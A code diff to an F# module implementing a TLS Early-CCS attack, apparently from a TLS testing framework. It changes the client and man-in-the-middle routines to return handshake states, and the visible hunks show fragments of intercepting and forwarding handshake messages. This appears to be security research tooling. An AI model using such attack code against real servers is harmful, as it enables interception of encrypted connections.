@@ -28,7 +28,7 @@ open FlexHandshake
 type Attack_EarlyCCS =
     class
 
-    static member run (server_name:string, ?port:int) : unit =
+    static member run (server_name:string, ?port:int) : state =
         let port = defaultArg port FlexConstants.defaultTCPPort in
 
         // Start TCP connection with the server
@@ -68,9 +68,9 @@ type Attack_EarlyCCS =
 
         let verify_data  = FlexSecrets.makeVerifyData nsc.si nsc.keys.ms Server (log @| ffC.payload) in
         let st,ffS       = FlexFinished.receive(st,verify_data) in
-        ()
+        st
 
-    static member runMITM (accept, server_name:string, ?port:int) : unit =
+    static member runMITM (accept, server_name:string, ?port:int) : state * state =
         let port = defaultArg port FlexConstants.defaultTCPPort in
 
         // Start being a Man-In-The-Middle
@@ -120,9 +120,7 @@ type Attack_EarlyCCS =
 
         // Forward server finished message
         let cst,sst,_ = FlexHandshake.forward(cst,sst) in
-
-        // done ;-)
-        ()
+        sst,cst
     end
 
 
